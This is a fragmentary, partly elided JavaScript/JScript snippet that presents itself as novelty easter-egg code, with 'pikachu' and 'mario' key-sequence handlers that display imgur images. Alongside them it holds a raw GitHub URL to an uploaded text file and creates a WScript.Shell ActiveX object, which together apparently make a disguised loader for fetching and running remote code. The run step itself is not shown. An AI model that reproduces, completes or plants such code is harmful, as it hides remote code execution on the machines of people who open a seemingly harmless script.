...
function pikachu() {
  ...
  var ck = 0;
  var max = key.length;
  var data = "https://i.imgur.com/zk0x2U2.png";
...
yes = "https://raw.githubusercontent.com/bhh545578-lab/gg1z1/main/uploaded/5566.txt";

sax = new ActiveXObject("WScript.Shell");
...
function mario() {
  ...
  var key = [77, 65, 82, 73, 79];
  var ck = 0;
  var max = key.length;

  var marioFunc = function () {
    var shock = document.createElement("div");
    var img = new Image();
    img.src = data;
  ...
  var data = "https://i.imgur.com/QbN03gd.gif";
